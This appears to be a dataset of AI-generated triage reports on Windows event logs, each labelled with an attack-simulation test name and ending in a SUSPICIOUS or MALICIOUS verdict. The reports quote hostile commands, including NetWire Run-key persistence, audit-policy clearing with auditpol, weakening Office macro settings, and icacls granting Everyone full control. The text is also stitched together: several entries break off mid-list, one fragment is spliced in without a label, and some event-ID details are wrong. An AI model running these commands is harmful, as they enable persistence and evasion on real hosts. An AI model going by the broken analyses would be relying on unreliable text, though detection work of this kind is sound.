   - The PowerShell activity mentioned earlier also matches the Sysmon logs, indicating that elevated permissions may have been utilized (`IntegrityLevel=High`), and attempts were made to remove traces of activities (clearing PowerShell history).

**Assessment:**

- **Time Synchronization Events (System & Security Logs):** These appear benign as they involve regular time synchronization processes.
  
- **Software Protection Platform Event (Application Log):** This event is benign, linked to routine licensing checks.

- **PowerShell Activity (PowerShell & Sysmon Logs):** The removal of PowerShell history is suspicious. This could indicate an attempt to hide potentially malicious activity executed via PowerShell.

- **Sysmon Activity:** The recurrent use of `wevtutil.exe` without any correlating benign administrative context could indicate attempts to manipulate or clear logs.

**Conclusion:**

Given the suspicious activity revolving around PowerShell command usage to delete history and the potential misuse of `wevtutil.exe`, these actions warrant concern and further investigation to rule out malicious intent. Thus, the overall assessment of these logs is:

**SUSPICIOUS**

**Guidance:**

1. **Investigate further:** Conduct deeper analysis on the `svchost.exe` and associated processes to determine any anomalous behavior.
2. **PowerShell History:** Manually review previous PowerShell execution logs or command usage that might have been deleted.
3. **Log Tampering:** Validate system and application logs to identify any gaps or evidence of log tampering or deletions.
4. **User Activity:** Review `admin_test` user's recent activities, including logon sessions and any resource accesses.
5. **Host Monitoring:** Implement enhanced monitoring on the host for oddities in process creations and PowerShell usage. Consider hunting for indicators of compromise with specialized threat intelligence.

These next steps would better inform whether there is indeed a compromise or if the activities are part of legitimate administrative work."
WMIC bypass using local XSL file,"## Analysis of the Windows Event Logs

### Overview

Upon reviewing the provided event logs from the CEO's machine (Server002), the following points summarize the significant findings and analysis regarding potential indicators of compromise:

1. **Security Logs:**
   - The logs indicate several logon events (`EventID 4624`) using the SYSTEM account and associated with privileges typically used by critical system processes (`EventID 4672`).
   - Repeated credential validation failures (`EventID 5379`) are noted for accounts including ""MicrosoftAccount:user=02txoixylodcstop"" and ""WindowsLive:..."" These reflect unsuccessful attempts to authenticate against Microsoft services, potentially indicating attempts of unauthorized access or misconfigurations.
   - Observations of the `taskhostw.exe` querying various accounts (`EventID 4798`) could suggest routine operations or them being leveraged for lateral movement.

2. **Sysmon Logs:**
   - The execution of PowerShell (`EventID 5`) and `wevtutil.exe` by the `admin_test` user is notable. Both are legitimate tools but can be used in malicious activities, including log clearing or system enumeration.
   - The invocation of unusual command-line arguments using `cmd.exe` and `wmic` commands to format and list processes may indicate attempts to gather system reconnaissance or execute payloads.
   - The appearance of `calc.exe` launched by `WMIC` seems benign but triggers concern in specific contexts where automation or scripting might be involved, which may not comply with expected usage behavior for an executive's machine.

3. **Edge Update Activity:**
   - There is extensive activity related to `MicrosoftEdgeUpdate.exe` in the Sysmon and Application logs. While much of this appears typical for application/self-update services, any irregularities or misconfigurations in its automated execution, particularly from temporary directories, should be cross-verified for integrity.
   
4. **Application Logs:**
   - There are entries indicating the service stops for `edgeupdate`, which could be routine but also suggest a need for comparing timestamps with known system issues or unintentional service disruptions.

### Conclusion

Based on the logs analyzed, the following summation aligns with the indicators observed:

- **SUSPICIOUS:** There are several points of interest that justify an elevation from benign to suspicious. The use of PowerShell and process enumeration commands, coupled with the failed credential validations and extensive Edge updating, raise questions that warrant further investigation.

### Guidance for Further Investigation

1. **Credential Attempts:**
   - Verify the source and intent behind the repeated failed credential validation attempts. Check if these credentials are expected on the machine or if they might suggest unauthorized access attempts.

2. **Process Execution Context:**
   - Further, validate the context around executed PowerShell and `wmic` usage with `admin_test`. Ensure this aligns with the expected behavior and roles, potentially correlating with any known benign scripts or tasks.

3. **Edge Update Verification:**
   - Confirm that the Microsoft Edge updates and related executables are legitimate and have not been tampered with. It may be useful to review update logs, configurations, and correlation with legitimate update cycles.

By focusing on these threads, you can ensure any potential security incidents are both detected early and mitigated effectively."
Invoke CHM with default Shortcut Command Execution,"### Detailed Analysis of the Logs:

1. **Application Log:**
   - The log entry here shows activity related to the ""Software Protection Platform Service"" (Event ID: 16384), which is a standard process on Windows systems related to software licensing. Its occurrence here without any additional context does not indicate malicious activity.

2. **Windows PowerShell Logs:**
   - Multiple PowerShell events (Event ID: 600) are logged where a PowerShell script or command seems to have been executed using syntax `powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`.
   - The command line involves a PowerShell script or function call `Invoke-ATHCompiledHelp`. This script appears to invoke the help file (`hh.exe`) with a compiled HTML help file (`Test.chm`).
   - Typically, invoking `.chm` files is a benign activity, but when engaged through PowerShell scripts in what appears to be a potentially automated or scripted manner, it could signify a vector for delivering payloads or malicious activity.

3. **Sysmon Logs:**
   - Multiple Sysmon events (Event ID: 5 and 1) indicate the execution of processes:
     - **PowerShell**: As previously noted, executed under the user `SERVER002\admin_test` with a script or function call.
     - **Conhost.exe**: The Console Window Host is a legitimate process, often connected to the execution of console-based applications. Its repeated appearance following PowerShell instances is expected but should be monitored if any suspicious activity or anomalous behavior occurs within those sessions.
     - **Wevtutil.exe**: Executed several times; this is used for managing event logs. Frequent execution could imply logs are being tampered with, although by itself it's not necessarily suspicious.
     - **Hostname.exe and Whoami.exe**: Both are legitimate Windows commands; `hostname.exe` is used to retrieve the computer's network name, and `whoami.exe` retrieves information about the current user.
     - **Sppsvc.exe**: The Software Protection Service, usually benign, especially since `NETWORK SERVICE` is executing it which is a standard security context for this service.

### Assessment of the Situation:

The logs indicate several legitimate Windows processes and standard administrative actions using PowerShell, possibly pointing towards either a scripted administrative task or potential misuse for malicious purposes using PowerShell.
The key concern lies with the PowerShell activity: using advanced functionalities like `Invoke-ATHCompiledHelp` and `.chm` files might indicate the potential for exploitation if not directly related to administrative scripting or maintainable IT operations.

### Threats or Risks Identified:

- **PowerShell Usage**: While PowerShell is a powerful tool and often used by IT administrators, it is also a common tool used by attackers due its ability to execute scripts remotely.
- **Execution of `Invoke-ATHCompiledHelp`**: Without additional information on the script and its purpose, it's unclear if this is an administrative task or something more insidious.
- **Frequent Use of `wevtutil.exe`**: May suggest tampering with logs, but could also be routine administrative work.

### Guidance on How to Proceed:

1. **Verification of PowerShell Scripts**: Investigate what `Invoke-ATHCompiledHelp` does. This includes verifying if this script is a part of normal operations or if it has been introduced by a third-party application or malicious actor.
2. **User Activity Review**: Examine the context or patterns in which the user `admin_test` is executing these commands. Check if these activities are part of their role.
3. **Further Log Investigation**: Correlate these logs with other security appliances or logs to understand the full scope of activity on `Server002`.

### Resolution:

Based on the logs provided and initial investigation:
- **SUSPICIOUS** - The activities involving PowerShell and potential manipulation of event logs through `wevtutil.exe` need further investigation. Without more context or supporting evidence, it cannot be conclusively deemed malicous, but there is enough potential for concern, hence initiating more detailed exploration into these commands and actions is recommended."
MSXSL Bypass using remote files,"## Analysis of Windows Event Logs

### Suspicious Behavior and Anomalies:

1. **Powershell Execution:**
   - **Sysmon EventID 5:** A process execution event shows a PowerShell instance `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` initiated by the user `SERVER002\admin_test`. However, it lacks detailed command-line arguments, which are useful in determining the legitimacy of the execution. PowerShell can be used for both legitimate administrative tasks and malicious purposes due to its scripting capabilities.

2. **CMD Execution with Suspicious Command-Line:**
   - **Sysmon EventID 1:** The process `C:\Windows\System32\cmd.exe` was executed with a command-line invoking an external executable `msxsl.exe` with XML and XSL files from a GitHub URL (raw.githubusercontent.com). This could indicate an attempt to execute a script from an external source, which is suspicious and could be a sign of a compromise or exploitation attempt via XML/XSL transformations.

3. **Wevtutil Execution:**
   - **Sysmon EventID 5:** Several instances of `wevtutil.exe`, a legitimate Windows utility used to manage event logs, were executed by `SERVER002\admin_test`. Although often used in legitimate administrative tasks, frequent or unexpected usage might indicate log manipulation attempts.

4. **Frequent execution of system utilities (conhost.exe and whoami.exe):**
   - **Sysmon EventID 1 and 5:** Multiple occurrences of `conhost.exe` and `whoami.exe` executions were detected. This is unusual if occurring in rapid succession without apparent legitimate batch processing context, especially when tied to user `admin_test`.

5. **Time Change Events:**
   - **Security and System Logs EventID 4616:** Show multiple time change events initiated by `LOCAL SERVICE`, under `C:\Windows\System32\svchost.exe`. While system time changes occasionally occur for synchronization, unexplained changes might be indicative of attempts to cover malicious activity.

6. **Microsoft Edge Update:**
   - The presence of Edge updates (`MicrosoftEdgeUpdate.exe`) and related processes is generally benign. However, due to a series of command-line executions and frequent process starts, this needs to be evaluated for automation or misconfigured update tasks, ensuring it isn't covering up for another process.

### Malicious Activity or Compromise Indicators:

- **Potential Malicious Indicator:** The most concerning logs are the `cmd.exe` executions with `msxsl.exe` from an external source as it suggests an attempt to execute scripts directly from an online repository—often indicative of a downloader or remote code execution tactic.

### Assessment, Risks, and Recommendations:

- **Current Assessment:** 
  - **Resolution:** **SUSPICIOUS**
  - The high frequency of certain system utilities and network-based script execution from PowerShell/cmd indicates potentially risky behavior that needs further investigation.

- **Risks Identified:**
  - Possible unauthorized script execution or command execution remotely could lead to data exfiltration, system compromise, or further propagation within the network.
  
- **Guidance for Further Action:**
  - Investigate the context of `msxsl.exe` usage - check for any known vulnerabilities or compromises involving similar patterns.
  - Review PowerShell and command-line auditing to confirm if the actions are expected by legitimate administrative scripts or user actions.
  - Examine external data sources or network tools leveraging known suspicious URIs for activities around the detected GitHub repository.
  - Correlate `wevtutil.exe` usage with activity to verify if it diverges from usual administrative operations, indicating potential log tampering.
  - Consider deploying network monitoring to catch any unexpected external communications tied to suspicious utilities or scripts.
  
The investigation should continue, with a focus on endpoint security tools, including behavioral analysis, and all suspicious activity should be escalated to incident response teams for further action. Evaluation of user roles and privileges should also be undertaken."
Modify UseTPMPIN Registry entry,"## Log Analysis and Findings

### Overview:
The provided logs span across various Windows event channels, focusing primarily on Sysmon events that record different process executions. Several key observations can be made from the logs, particularly around process creation and command-line activities. The goal is to identify any signs of malicious activity that could indicate a potential compromise on the CEO's machine.

### Analysis:

1. **Frequent Execution of System Utilities:**
   - A series of processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, `svchost.exe`, `WmiPrvSE.exe`) were executed in rapid succession, all associated with the user `SERVER002\\admin_test`.
   - While execution of these utilities can be benign, the pattern and context suggest they could be part of a script execution or a post-exploitation activity where an intruder uses native tools to extract information or make changes.

2. **Registry Modifications:**
   - The command `cmd.exe /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f` was observed. This command modifies registry settings related to BitLocker, indicating an attempt to manipulate system security settings.
   - Such registry changes without proper justification could be indicative of a malicious attempt to alter system behavior, possibly as part of a privilege escalation or persistence mechanism.

3. **Security Tools and Built-in Commands:**
   - Execution of `whoami.exe` is typically used to gather user information during reconnaissance activities. 
   - `hostname.exe` and `whoami.exe` usage in quick succession might be legitimate if part of an administrative task but also aligns with the behavior of an attacker footprinting the machine.
   
4. **Unusual Timing and Frequency:**
   - Processes executed within milliseconds of each other suggest the possibility of automated execution rather than manual execution. This implies a script or a scheduled task may be involved.

### Threat Assessment:
Considering the context and nature of these events, there appear to be several indicators that suggest suspicious activity. The command-line executions with registry alterations, combined with rapid process creation, indicate potential unauthorized or harmful behavior.

### Recommendations for Resolution:

- **Resolution: SUSPICIOUS**
  - **Further Investigation:** It is recommended to investigate the source of these command executions. Confirm if scheduled tasks or scripts are intended by legitimate users or if they could be indications of a compromise.
  - **Audit Logs:** Review logs for any unauthorized access or elevated privileges. Identify any scripts or scheduled tasks that may have been recently added or altered.
  - **Network Activity:** Check network logs for connections from unexpected or suspicious external IP addresses around the times these events occurred.
  - **Endpoint Protection Review:** Ensure endpoint security tools are updated and conduct a full scan of the system to detect any residual threats.

This analysis concludes that while direct evidence of malware is not present, the rapid and suspicious nature of system utility usage warrants further examination to absolutely rule out malicious activities."
Create ADS command prompt,"Based on the provided Windows event logs, a few key indicators may suggest suspicious or potentially malicious activity that needs further investigation. Here's a detailed analysis of the logs:

### Suspicious Findings:

1. **Time Manipulation Events:**
   - Multiple events indicate changes to system time (Event IDs for security logs: 4616). Time changes are associated with the `svchost.exe` process, which is a legitimate Windows process but can be leveraged by malware.
   - Time manipulation can be employed to evade detection mechanisms or synchronize malicious activities.

2. **Excessive Privilege Usage:**
   - Event ID 4672 in the security logs showcases privileged login with numerous sensitive privileges such as `SeDebugPrivilege`, which can allow full control over the system.
   - The account ""admin_test"" appears to execute these privileged operations. This activity should be scrutinized, especially if the account usage is unexpected or unauthorized.

3. **Command Execution:**
   - Sysmon Events related to `cmd.exe` (e.g., Event ID 18000, 18002) show evidence of potentially suspicious command execution with a command line meant to output and read ""Shell code execution"" hidden in an alternate data stream.
   - The use of alternate data streams and shell code terminology in command lines can indicate attempts at stealthy or malicious execution.

4. **Process Behavior:**
   - `wevtutil.exe` and `conhost.exe` are executed multiple times. While these are legitimate Windows processes, they frequently appear in forensic investigations of attacks, especially if spawned abnormally.
   - Check if the frequent launching corresponds with typical administrative usage or if they appear outside maintenance windows, which could suggest abuse.

5. **Addition of Other Software:**
   - Instances of `sppsvc.exe` and `TrustedInstaller.exe` (Sysmon Event ID 18009, 18013) running under the system account can be part of normal system operations, but should be monitored if other indicators of compromise are present.

### Overall Threat Assessment:

Given the outlined suspicious activities, especially the combination of system time changes, execution of commands with alternate data streams, and usage of high privileges, this behavior is concerning.

### Recommended Resolution:

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Contain and Monitor:**
   - Temporarily suspend suspicious accounts such as ""admin_test"" while conducting further investigation.
   - Increase logging around `svchost.exe`, `cmd.exe`, and other involved processes to capture unusual activity.

2. **Perform a Detailed Investigation:**
   - Conduct a full forensic investigation on the affected systems to understand the scope and intent of the actions.
   - Analyze network logs to check for unusual outbound connections that might correlate with time manipulation events.

3. **Review Permissions:**
   - Review privilege assignment on the system and reduce access to essential personnel.
   - Reaffirm policies concerning time changes and privileged account usage.

4. **Engage Incident Response:**
   - Coordinate with incident response teams to evaluate the potential compromise and any exfiltration risks.
   - Prepare for potential clean-up and remediation actions if malicious activity is confirmed after further investigations."
Hidden Window-Conhost Execution,"Upon reviewing the provided Windows event logs, several points of interest stand out when assessing for potential malicious activity:

1. **Process Execution Patterns**:
   - Frequent execution of typical Windows utilities such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe`. The execution of these binaries alone typically suggests standard usage or script activity. The ""whoami"" and ""hostname"" commands can sometimes be used as part of reconnaissance activities, but they are also commonly used by scripts for legitimate user context gathering.
   - Notably, the execution of `powershell.exe` with the command `""powershell.exe & {conhost.exe --headless calc.exe}""` stands out. Usage of PowerShell to invoke a process in this way often aligns with suspicious activity and techniques used to hide malicious actions or perform in-memory execution.

2. **Use of `conhost.exe` and Context**:
   - The logs display the `conhost.exe` being executed with arguments indicating headless operation, specifically tied with PowerShell and this particular execution flow. While `conhost.exe` is a legitimate Windows process, its combination with PowerShell to evoke a calculator (`calc.exe`) in headless mode could signal masquerading or suspicious script execution designed to perform actions without user visibility.

3. **Privilege Context**:
   - All logged processes are initiated by the user ""SERVER002\\admin_test"" with a high integrity level, suggesting administrative privileges. This fact adds weight to the potential impact if indeed the PowerShell command is executed with malicious intent. 

4. **Time Events**:
   - Certain system time change events can indicate tampering, though here it seems more related to normal system operations or time synchronization (`time.windows.com`).

5. **Lack of Direct Evidence of Known Threats**:
   - There is no direct evidence from the logs themselves of a known malicious hash or identified hostile IP communications.

**Assessment**:

- The PowerShell invocation of `calc.exe` suggests a more probing investigation due to its untypical usage pattern in normal administrative activity. The combination with `conhost.exe` especially with a headless flag raises concerns typical of script-initiated processes that are seeking to bypass detection or user notification.

**Guidance**:

- Perform deeper analysis of the machine for other behavioral artifacts often associated with this kind of PowerShell execution, such as network connections initiated at the same time or subsequent logs consistent with data exfiltration, registry or environment changes.
- Check for any automated scripts or tasks that may be executing these commands and review their intended use.
- Review any additional logs, particularly those related to PowerShell (Windows PowerShell logs) for further insight into the scripts executed and their contents.

**Resolution**: **SUSPICIOUS** – The logs contain activity that warrants further investigation, particularly concerning the unconventional PowerShell and `conhost.exe` usage. Further indicators may confirm or refute the presence of malicious actions."
NetWire RAT Registry Key Creation,"### Analysis of Windows Events

#### Anomalies and Suspicious Behavior Detected

1. **Use of Command Line Utilities for Potential Persistence:**
   - The execution of `cmd.exe` with a complex command line involving several `reg add` commands for creating entries related to ""NetWire"" suggests an attempt to establish persistence. The registry keys, particularly `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, are commonly used for programs to start automatically when a user logs in.
   - Command used: `""cmd.exe"" /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f ...`.

2. **Installation of Potentially Malicious Software:**
   - The presence of a registry entry for a ""Host.exe"" file in the user’s AppData suggests that this executable might be installed for malicious purposes, potentially as part of a Remote Access Trojan (RAT) setup.
   - The creation of additional registry subkeys under `HKCU\SOFTWARE\NetWire` such as `HostId` and `Install Date` indicates premeditated configuration typically seen in malware operations.

3. **High Integrity Level Execution:**
   - Many processes, particularly those running command line utilities and registries, are executed with a high integrity level, suggesting potential privilege misuse.

4. **Unusual Pattern of System Process Executions:**
   - The rapid sequence and combination of processes like `wevtutil.exe` and `conhost.exe` without clear legitimate context is often used in evasion techniques or malware.

5. **Microsoft Edge Update Processes:**
   - Frequent execution of Microsoft Edge Update related processes (`MicrosoftEdgeUpdate.exe`) might be part of regular application update tasks. However, their close temporal proximity with more suspicious events could rationalize escalation as they could be leveraged in masquerading techniques.

#### Malicious Indicators

- **Indicator of Compromise (IoC):** Registry entries for ""NetWire"" linked to potential malware installation.
- **Manipulation of Registry:** Commands altering the Registry suggest establishing persistence.

Disable Microsoft Office Security Features,"Upon reviewing the provided logs, several observations and analyses can be made:

### Analysis:

1. **Frequent Execution of System Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed within a very short time frame. These utilities are legitimate Windows processes, but frequent invocations can sometimes be indicative of scripting or automated tasks that may be part of unauthorized or malicious activity.

2. **PowerShell Execution:**
   - A PowerShell script was executed with commands targeting the modification of registry paths related to Microsoft Office security settings, specifically for Excel. The command attempts to modify `VBAWarnings` and `ProtectedView` settings, which could be an attempt to weaken security by disabling protected view and lowering macro warning levels.

3. **Parent Process and User Context:**
   - The PowerShell commands and other processes are executed under the context of `SERVER002\admin_test`, indicating they are being run with administrative privileges. This could pose a risk if these actions were not intended by an authorized user.

4. **Updates and System Component Activity:**
   - Microsoft Edge and Windows Defender updates were occurring, which are typical and expected system activities. However, when juxtaposed with potentially suspicious activities, it is important to verify if there is any correlation or causation.

5. **Security & Application Logs:**
   - Windows Defender was active during this period, as indicated by the security intelligence update and security product state logs, which imply continued protection by Windows Defender. There are no indicators of any detected malicious activity in the logs provided.

6. **Windows Event Security ID 4624 and 4672:**

Malware Masquerading and Execution from Zip File,"After a detailed analysis of the provided Windows event logs, the following observations have been made:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution (Windows PowerShell Log)**
   - The PowerShell logs show the execution of a command that extracts a zipped file (`data.zip`) from a temporary directory and then navigates to the extracted location to execute a command file (`README.cmd`). 
   - The `README.cmd` execution is suppressed (`> $null 2> $null`), which is a technique often used to avoid logging errors or outputs, indicative of potentially hiding malicious actions.

2. **Privilege Escalation and Privileged Commands (Security Log)**
   - User `admin_test` has been granted a long list of privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are quite powerful and can be used for malicious purposes.
   - The user `admin_test` also logs in (Logon Type: 3, indicating a network login) from a workstation named `DESKTOP-3HL5B2P`, which may suggest a remote access attempt.

3. **Unusual Process Activity (Sysmon Log)**
   - The command executed by PowerShell (from `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) triggers the cascaded execution of various system processes, including `cmd.exe`, `rundll32.exe`, and references to a possibly unknown or malware DLL (`2.dll, StartW`).
   - Lateral movement or execution control might be involved as `rundll32.exe` is known to be used for loading and executing DLLs (possibly malicious).

4. **Multiple executions of Microsoft Edge Installer (Sysmon Log)**
   - Multiple processes under the Edge Installer, such as `setup.exe` with varying command-line arguments, suggest software updates or installations, which might be benign if verified. However, given the context of potential suspicious activity, it could also be leveraged by malware masquerading as legitimate updates.

### Threats or Risks Identified:
- Execution patterns and commands indicate harmful intentions, possibly related to data exfiltration through temporary archive manipulation.
- Privileged access granted to a user (`admin_test`) who may not require such extensive permissions raises a red flag for misuse.
- The involvement of DLL execution via `rundll32.exe` indicates possible code injection or execution of malicious payloads.

### Assessment:
The activity observed from these logs presents multiple indicators of potential malicious conduct, raising significant concerns regarding the security posture of the CEO's machine on Server002. The combination of powerful privilege assignments, suppressed outputs, and execution chains involving possible malware indicate this machine may be compromised.

### Guidance on How to Proceed:
- Immediate isolation of the affected host (`Server002`) to prevent further potential damage or data exfiltration.
- Thorough inspection and validation of the user account `admin_test` and any associated permissions and activities.
- Detailed review of the `README.cmd` and the `2.dll` files involved in execution to confirm their legitimacy or malicious intent.
- Cross-verification of Microsoft Edge Update processes to ensure their authenticity and integrity.

### Resolution:
- **MALICIOUS**: The logs exhibit patterns that strongly suggest hostile actions, and immediate action should be taken to investigate and mitigate identified threats."
Clear Windows Audit Policy Config,"**Analysis of Windows Event Logs:**

1. **Time Sync and System Logs:**
   - **Kernel-General and Time-Service Logs:** There are multiple entries indicating time synchronization changes involving the `svchost.exe` process. The time sync seems legitimate, associated with `time.windows.com`, and no suspicious process or outlier time changes are observed. Such time sync events, particularly involving `svchost.exe`, are common and typically benign unless there are repeated irregular changes which are not evident here.
   
2. **Security Logs:**
   - **Event ID 4624 (Logon Success):** There are successful logon events for the `admin_test` user using the NTLM authentication method from `DESKTOP-3HL5B2P` and an IPv6 address, followed by an IPv4 internal address. These external devices logging into a high-privilege account can be indicative of lateral movement if not recognized.
   - **Event ID 4672 (Special Privileges Assigned):** The `admin_test` account receives privileged access which includes `SeDebugPrivilege` and other escalated rights. This suggests administrative activity but can escalate risk if unexpected.
   - **Event ID 4719 (Audit Policy Changes):** Indicates changes in audit policies, potentially to evade detection.

3. **Sysmon Logs (Process Creation):**
   - **Execution of `wevtutil.exe` and `audipol.exe`:** Multiple instances of `wevtutil.exe` and `auditpol.exe` executed by `admin_test` exist, indicating attempts to potentially clear event logs or modify audit policies. This behavior is highly suspicious as it suggests an attempt to delete traces of the activity.
   - **Execution of `cmd.exe` with `auditpol` commands:** The sequence of `cmd.exe` execution with `auditpol /clear /y & auditpol /remove /allusers` confirms audit log modification actions directly, which is often associated with malicious intent to cover tracks.
   - **Use of `whoami.exe`:** Usage of this utility shows typical actions of a script or an attacker trying to ascertain the current user context.

**Assessment:**
The sequence of events, including special privilege assignment, audit policy changes, and consistent execution of tools to manage or clear logs, all strongly suggest malicious activity consistent with actions to cover unauthorized access or lateral movement in the network, particularly concerning the `admin_test` user profile. 

### Resolution: MALICIOUS

**Guidance on How to Proceed:**

1. **Immediate Recommendations:**
   - Isolate the affected machine (Server002) from the network to prevent any onward lateral movement or data exfiltration.
   - Perform a forensic investigation to assess how access was gained and the potential scope of the compromise.

   - The execution of PowerShell without apparent command-line arguments can be considered suspicious, especially if it lacks the context of legitimate administrative activity.

2. **Repeated Invocations of `wevtutil.exe`:**
   - The `wevtutil.exe` (Windows Events Command Line Utility) is executed multiple times in rapid succession. During incident investigations, this tool is often used by attackers to manipulate or clear event logs to cover tracks. Executions logged:
     - `wevtutil.exe` Process IDs: 5376, 6616, 1920, 5756, 3128.
   - The associated user is again `SERVER002\admin_test`.

3. **Command-Line Arguments and Use of `cmd.exe`:**
   - There's a suspicious command executed via `cmd.exe`: 
     ```
     ""cmd.exe"" /c ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" createvm --name ""file VM"" --register & ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" modifyvm ""file VM"" --firmware efi & ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" startvm ""file VM""
     ```
   - This command involves operations with VirtualBox, configuring a virtual machine which might indicate an attempt to create an isolated environment to execute malicious tasks.

4. **Use of `hostname.exe` and `whoami.exe`:**
   - These commands are executed: 
     - `hostname.exe`, `whoami.exe`
   - While these are legitimate system utilities, if executed in context with other suspicious behaviors, they can indicate an attempt to gather information on the current user and system environment.

5. **Microsoft Edge Installer Activities:**
   - Regular update processes for Microsoft Edge are observed, executed by `NT AUTHORITY\SYSTEM`. 
   - These activities appear standard and are expected for a system performing regular updates.

6. **TrustedInstaller and TiWorker:**
   - Activities involving `TrustedInstaller.exe` and `TiWorker.exe` are present, which are standard Windows components for installation and update operations.
   - These do not appear to be part of suspicious activity.

### Assessment and Conclusion:

- **Primarily Suspicious Behavior:**
  - PowerShell execution could indicate unauthorized automation or scripting.
  - The repeated, quick succession of `wevtutil.exe` executions could suggest attempts to tamper with event logging, commonly associated with evasion techniques.
  - The `cmd.exe` command leveraging VirtualBox indicates potentially unauthorized activity to create a secluded operational environment on the CEO's machine.
  
- **Resolution: SUSPICIOUS**

Given the observations, especially regarding `wevtutil.exe` usage and the potential misuse of VirtualBox, further investigation would be advised. It is crucial to validate whether these actions align with expected administrative tasks or if there's evidence of unauthorized access attempting to obfuscate malicious actions.

"
Activate Windows NoControlPanel Group Policy Feature,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis of Logs

1. **Sysmon Logs:**
   - **Whoami and Hostname Execution:**
     - The repeated execution of `whoami.exe` and `hostname.exe` suggests an enumeration attempt to gather information about the user identity and machine details. While these commands are not inherently malicious, their presence, especially in rapid succession and without clear legitimate reasons, could indicate an attempt by an actor to understand or pivot within the environment.
   
2. **Registry Modifications:**
   - The execution of `cmd.exe` with command-line arguments to add a registry key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` /v NoControlPanel /t REG_DWORD /d 1 /f) is suspect. This particular modification disables the Control Panel, which is indicative of a technique that might be used by malware to limit user interaction and ability to troubleshoot or reverse malicious changes.
   
3. **Edge Update Activity:**
   - The frequent execution of the Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) aligns with standard software update procedures. However, these processes are associated with system-level privileges (executed as `NT AUTHORITY\SYSTEM`). Given they are related to software updates, they are not suspicious in this context unless their hashes or versions do not match legitimate binaries.

4. **Unusual Timing and Correlation:**
   - The clustering of these events in a short time frame might be typical during a scheduled update or configuration change. However, the specific combination of system enumeration, command-line registry changes, and repeated processes suggests potential suspicion.

### Conclusion and Risk Assessment

- **Suspicious Indicators:**
  - The combination of enumeration commands (`whoami.exe`), registry modifications disabling Control Panel access, and the timing/context of these actions raise suspicions of potential malicious activity.
  - It is plausible that an attacker or malicious payload attempted to gather information on the system and modify configurations to hinder user interventions.

### Resolution

- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed

1. **Further Investigation:**
   - Verify the context and source of the registry changes and relate them to any known application or system updates.
   - Cross-reference the timestamps and processes with any User Access Logs, VPN logs, or other relevant sources to identify cluster of these activities with potential unauthorized access.
   
2. **Immediate Measures:**
   - Conduct a thorough check of the affected system for additional evidence of compromise.
   - Check for any unauthorized scheduled tasks or persistent mechanisms.
   - Review network traffic logs around the event times for any unusual or unauthorized data transfers.
   
3. **Preventive Measures:**
   - Harden user account configurations, especially for high-value targets like CEOs, limiting unnecessary elevated permissions.
   - Strengthen monitoring and alert configurations for specific command-line arguments known to be suspicious.
   - Ensure continuous employee training on recognizing and reporting suspicious activities. 

Overall, while there is no definitive evidence of a specific malware or breach at this point, the activities warrant further investigation to rule out malicious intent."
BlackByte Ransomware Registry Changes - CMD,"Upon reviewing the provided Windows event logs, the following observations and analyses can be made:

### Suspicious or Anomalous Behavior:
1. **Wevtutil, Conhost, Hostname, Whoami, and CMD Execution:** 
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are observed running around the same timeframe.
   - `wevtutil.exe` is often used for managing event logs, which might be benign but can also be used for clearing event logs after unauthorized activities.
   - `cmd.exe` is used with commands to modify registry settings which could potentially modify system behavior:
     - `LocalAccountTokenFilterPolicy`
     - `EnableLinkedConnections`
     - `LongPathsEnabled`
   - Such registry manipulations can often be associated with lateral movement or persistence mechanisms used by attackers.

2. **Integrity Level & Modification of Registry:**

cacls - Grant permission to specified user or group recursively,"After reviewing the provided event logs, the following observations and analysis can be made:

### **Security Log Observations:**
1. **EventID 4616:** There is repeated evidence of system time changes involving `svchost.exe`. Time changes by legitimate and trusted processes can be routine, however, it's worth ensuring this is expected behavior especially if correlating with suspicious activity.

### **Application Log Observations:**
1. **SPP Service Events (EventID 16384, 903):** These events relate to the Software Protection Platform Service, which manages licensing. There's no immediately suspicious activity observed in relation to these logs in isolation.

### **System Log Observations:**
1. **Kernel-General and Time-Service (EventID 24, 1, 35):** The logs indicate time change events, and synchronization with `time.windows.com` as a time source, which is usually standard behavior.

### **Sysmon Log Observations:**
1. **Process Commands (cmd.exe, conhost.exe, wevtutil.exe):** 
   - The use of `cmd.exe` with `icacls.exe` to grant `""Everyone:F""` (full control for everyone) is highlighted. This is unusual and may present a security risk if executed without proper context or authorization because it potentially exposes sensitive data.
   - The sequences of `cmd.exe` processes creating temporary directory files are moderately suspicious, especially if typically unnecessary for an administrative user.
   - Usage of `wevtutil.exe` suggests interaction with event logs. While legitimate for system management, unauthorized use could be concerning.
   - Several executions and spawns of console windows (`conhost.exe`) might be considered normal if associated tasks were active, yet there's a pattern matching each `cmd` operation, which is not typical for standard administrative behavior.

2. **Hostname and Whoami Commands:**
   - The execution of `hostname.exe` and `whoami.exe` commands from a high-integrity level could be part of routine actions or diagnostics, but they might indicate an attacker trying to understand the environment.

### **Assessment:**
